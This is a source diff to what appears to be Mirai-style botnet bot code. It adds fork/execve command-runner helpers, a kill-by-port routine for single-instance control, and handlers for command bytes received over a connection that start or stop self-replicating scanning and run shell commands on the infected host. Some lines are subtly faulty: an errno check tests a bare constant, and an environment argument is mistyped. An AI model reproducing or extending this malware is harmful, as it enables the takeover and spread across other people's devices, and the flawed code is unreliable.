@@ -79,7 +79,7 @@ static void ensure_bind(uint32_t bind_addr)
         return;
     }
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(1337);
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
     addr.sin_addr.s_addr = bind_addr;
     NONBLOCK(fd);
     errno = 0;
@@ -95,7 +95,7 @@ static void ensure_bind(uint32_t bind_addr)
     }
     if(ret == -1 && EADDRINUSE)
     {
-        killer_kill_by_port(htons(1337));
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
 		sleep(1);
 		ensure_bind(bind_addr);
 		return;
@@ -229,6 +229,66 @@ void test(){
 
 }
 */
+
+// "PATH=/home/user/bin:/usr/local/bin:/usr/bin:/bin"
+
+static unsigned char *envp_list[] =
+{
+    (unsigned char *)"PATH=/home/user/bin:/usr/local/bin:/usr/bin:/bin:/sbin", 
+    NULL
+};
+
+void _runcmd(const unsigned char *path, const unsigned char **argv)
+{
+    unsigned char **envp = envp_list;
+
+    pid_t pid = fork();
+
+    if (pid == 0) {
+        // Child process
+        execve((char *)path, (char **)argv, (char **)envp_list[0]);
+        _exit(0);
+        return;
+    } else if (pid > 0) {
+        // Parent process
+        wait(NULL);
+        return;
+    } else {
+        // Fork failed
+        if(vfork() == 0)
+        {
+            execve((char *)path, (char *const*)argv, (char *const*)envp);
+            _exit(0);
+        }
+        return;
+    }
+}
+
+void runcmd(const unsigned char *path, const unsigned char **argv)
+{
+    unsigned char **envp = {NULL};
+
+    pid_t pid = fork();
+
+    if (pid == 0) {
+        // Child process
+        execve((char *)path, (char **)argv, (char **)envp);
+        _exit(0);
+        return;
+    } else if (pid > 0) {
+        // Parent process
+        wait(NULL);
+        return;
+    } else {
+        // Fork failed
+        if(vfork() == 0)
+        {
+            execve((char *)path, (char **)argv, (char **)envp);
+            _exit(0);
+        }
+        return;
+    }
+}
 
 int main(int argc, char **args)
 {
@@ -524,6 +584,19 @@ int main(int argc, char **args)
 					scanner_init();
 					#ifdef DEBUG
 					printf("[main/conn]: started selfrep from cmd 0xff\r\n");
+					#endif
+				}
+				else if(rdbuf[0] == '\xFE')
+				{
+					scanner_kill();
+					#ifdef DEBUG
+					printf("[main/conn]: stopped selfrep from cmd 0xff\r\n");
+					#endif
+				}
+				else if(rdbuf[0] == '\xFD')
+				{
+					#ifdef DEBUG
+					printf("[main/conn]: Running Shell CMD %s\r\n", rdbuf+1);
 					#endif
 				}
 				else
